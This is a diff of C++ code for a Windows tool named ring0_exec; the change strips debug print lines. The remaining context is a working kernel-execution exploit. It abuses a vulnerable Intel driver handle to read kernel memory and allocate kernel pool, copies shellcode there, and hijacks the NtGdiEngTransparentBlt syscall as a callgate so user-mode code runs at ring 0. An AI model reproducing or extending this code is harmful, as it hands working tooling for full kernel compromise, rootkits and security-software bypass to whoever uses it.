@@ -63,41 +63,29 @@ ring0_exec::ring0_exec(
 	PRINTVAR(R3_win32u, "%p");
 	// Find NtGdiEngTransparentBlt
 	this->R3_syscall = reinterpret_cast<uintptr_t>(this->pGetProcAddress(R3_win32u, "NtGdiEngTransparentBlt"));
-	PRINTVAR(this->R3_syscall, "%llx");
 	// Find win32k.sys Modul-Base
 	const auto R0_win32k = reinterpret_cast<void*>(this->GetKernelModuleAddress("win32k.sys"));
-	PRINTVAR(R0_win32k, "%p");
 	// Calculate NtGdiEngTransparentBlt Address
 	const auto R0_NtBlt = ptr_field(offset::_PUBLIC::NtGdiEngTransparentBlt, R0_win32k);
-	PRINTVAR(R0_win32k, "%p");
 	// Calculate Callgate-Address-Calculation-RIP
 	const auto R0_NtGdiEngTransparentBlt_RIP = adr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_Rip, R0_NtBlt);
-	PRINTVAR(R0_NtGdiEngTransparentBlt_RIP, "%llx");
 	// Calculate Callgate RIP Offset-Pointer
 	const auto R0_NtBlt_RIP_GATE_OFFSET_PTR = adr_field(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_RipGate, R0_NtBlt);
-	PRINTVAR(R0_NtBlt_RIP_GATE_OFFSET_PTR, "%llx");
 	// Readback Callgate RIP Offset
 	this->pReadMemory(this->hDevIntel,
 		R0_NtBlt_RIP_GATE_OFFSET_PTR, static_cast<void*>(&this->R0_NtBlt_RIP_GATE_OFFSET),
 		min(offset::_HANDWRITTEN::NtGdiEngTransparentBlt_RipGate.bytes, sizeof(this->R0_NtBlt_RIP_GATE_OFFSET)));
-	PRINTVAR(this->R0_NtBlt_RIP_GATE_OFFSET, "%llx");
 	// Calculate Callgate-Pointer Address
 	this->R0_NtBlt_RIP_GATE_PTR = R0_NtGdiEngTransparentBlt_RIP + this->R0_NtBlt_RIP_GATE_OFFSET;
-	PRINTVAR(this->R0_NtBlt_RIP_GATE_PTR, "%llx");
 	// Readback Callgate-Pointer
 	this->pReadMemory(this->hDevIntel, this->R0_NtBlt_RIP_GATE_PTR, static_cast<void*>(&this->R0_NtBlt_RIP_GATE), sizeof(this->R0_NtBlt_RIP_GATE));
-	PRINTVAR(this->R0_NtBlt_RIP_GATE, "%llx");
 	// Allocate Kernel-Memory
 	this->R0_CallG_RIP_GATE = this->pAllocatePool(this->hDevIntel, nt::POOL_TYPE::NonPagedPool, sizeof(ring0_exec::shellcode));
-	PRINTVAR(this->R0_CallG_RIP_GATE, "%llx");
 	this->R0_Fnc_UnhookSelf = this->R0_CallG_RIP_GATE + ring0_exec::R0_O_unhookself;
-	PRINTVAR(this->R0_Fnc_UnhookSelf, "%llx");
 	// Find ntoskrnl.exe Modul-Base
 	this->R0_ntoskrnl = this->GetKernelModuleAddress("ntoskrnl.exe");
-	PRINTVAR(this->R0_ntoskrnl, "%llx");
 	// Find ExFreePool
 	this->pExFreePool = this->pGetKernelModuleExport(this->hDevIntel, this->R0_ntoskrnl, "ExFreePool");
-	PRINTVAR(this->pExFreePool, "%llx");
 	// Edit Shellcode
 	memcpy(&ring0_exec::shellcode[R0_Callgate_Mag], &ring0_exec::magic, sizeof(ring0_exec::magic));
 	memcpy(&ring0_exec::shellcode[R0_Callgate_Org], &this->R0_NtBlt_RIP_GATE, sizeof(this->R0_NtBlt_RIP_GATE));
@@ -110,13 +98,10 @@ ring0_exec::ring0_exec(
 	ring0_exec::is_hooked = true;
 	// Find RtlCopyMemory
 	this->pRtlCopyMemory = this->pGetKernelModuleExport(this->hDevIntel, this->R0_ntoskrnl, "RtlCopyMemory");
-	PRINTVAR(this->pRtlCopyMemory, "%llx");
 	// Find ExAllocatePool
 	this->pExAllocatePool = this->GetKernelModuleExport(this->R0_ntoskrnl, "ExAllocatePool");
-	PRINTVAR(this->pExAllocatePool, "%llx");
 	// Find MmGetPhysicalAddress
 	this->pMmGetPhysicalAddress = this->GetKernelModuleExport(this->R0_ntoskrnl, "MmGetPhysicalAddress");
-	PRINTVAR(this->pMmGetPhysicalAddress, "%llx");
 }
 
 intptr_t ring0_exec::ring0_call(
